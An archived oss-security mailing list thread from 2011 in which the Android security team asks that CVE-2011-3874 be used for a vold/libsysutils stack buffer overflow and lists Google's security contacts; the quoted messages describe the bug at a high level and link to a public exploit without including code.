| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2011/11/09/6) [[next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAFJ0LnE0AMi4x8rSdNjp-Ja7YRap-7qUgSYUiJRFk-GKY=vL=g@mail.gmail.com>
Date: Wed, 9 Nov 2011 15:03:38 -0800
From: Nick Kralevich <nnk@...gle.com>
To: oss-security@...ts.openwall.com, kseifried@...hat.com
Cc: dan.j.rosenberg@...il.com
Subject: Re: Re: CVE request: Android: vold stack buffer overflow

Hi Kurt / Dan,

Nick Kralevich here from the Android security team.

Google is a CNA (CVE Numbering Authority), and we've already assigned
this vulnerability CVE-2011-3874. To avoid confusion, I would
appreciate it if CVE-2011-3874 would be considered the authoritative
CVE for this vulnerability, and CVE-2011-4123 should be marked as a
duplicate. More information on the vold vulnerability, including a
patch, can be found at
<http://code.google.com/p/android/issues/detail?id=21681>

For the record, Google maintains several security contact mailing
lists.  In general, you can reach Google security by e-mailing
security@...gle.com or visiting
<http://www.google.com/about/corporate/company/security.html>

For Android specific security issues, the preferred e-mail address is
security@...roid.com, or you can visit
<http://developer.android.com/resources/faq/security.html#issue>

For Chrome specific security issues, the preferred e-mail address is
security@...omium.org, or you can visit
<http://dev.chromium.org/Home/chromium-security/reporting-security-bugs>

In general, e-mailing security@...gle.com will eventually get to
Chrome or Android, although it's faster to contact the product
specific security alias first.

Because Google is a CNA, we maintain our own pool of CVEs from Mitre.
Any of the addresses above can issue CVEs for Google related
vulnerabilities.

Thanks!
-- Nick Kralevich
   Android Security Team

> On 11/08/2011 06:08 AM, Dan Rosenberg wrote:
> > On Tue, Nov 8, 2011 at 8:03 AM, Dan Rosenberg <dan.j.rosenberg@...il.com> wrote:
> >> A local user with group "log" on Android may send a malformed message
> >> to vold ("volume daemon"), causing a stack buffer overflow.  This has
> >> been demonstrated to be exploitable to escalate privileges to root on
> >> all Froyo (2.2.x) and Gingerbread (2.4.x)  devices via freeing an
> >> arbitrary heap object and triggering a use-after-free condition [1].
> >> It appears the bug was silently patched in Honeycomb (3.x), but note
> >> that since Honeycomb is not open source, it does not fall within the
> >> scope of this list.  Bug discovered and exploited by the Revolutionary
> >> team [2].
> >>
> > Oops, a few minor corrections.
> >
> > Typo: Gingerbread is 2.3.x.  Also, the vulnerability actually lives in
> > the libsysutils library, and was demonstrated to be exploitable via
> > vold, which makes use of the affected library function.  Sorry for the
> > noise.
> >
> >> -Dan
> >>
> >> [1] <https://github.com/revolutionary/zergRush/blob/master/zergRush.c>
> >> [2] <http://revolutionary.io/>
> >>
> Please use CVE-2011-4123 for this issue.
>
> --
>
> -Kurt Seifried / Red Hat Security Response Team
>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from code.google.com_5651703d_20250125_150053.html ===
[Sign in](https://accounts.google.com/ServiceLogin?passive=1209600&osid=1&continue=https%3A%2F%2Fissuetracker.google.com%2Fissues%2F36935122&followup=https%3A%2F%2Fissuetracker.google.com%2Fissues%2F36935122&ec=GAZAkwI)
